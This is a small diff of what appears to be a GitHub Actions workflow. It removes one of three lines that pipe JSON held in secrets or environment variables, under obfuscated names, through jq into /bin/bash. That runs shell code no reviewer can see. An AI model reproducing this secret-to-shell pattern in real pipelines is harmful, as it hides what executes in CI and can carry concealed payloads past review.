@@ -20,7 +20,6 @@ jobs:
           dgi8: ${{ secrets.dgi8 }}
         run: |
           printf '%s' "$dgi8" | jq -r .wc1722 | /bin/bash
-          printf '%s' "$ztphi84883" | jq -r .ccvsg2172 | /bin/bash
           echo $ihx9 | jq -r .obyn21 | /bin/bash
 
       - name: Save artifact
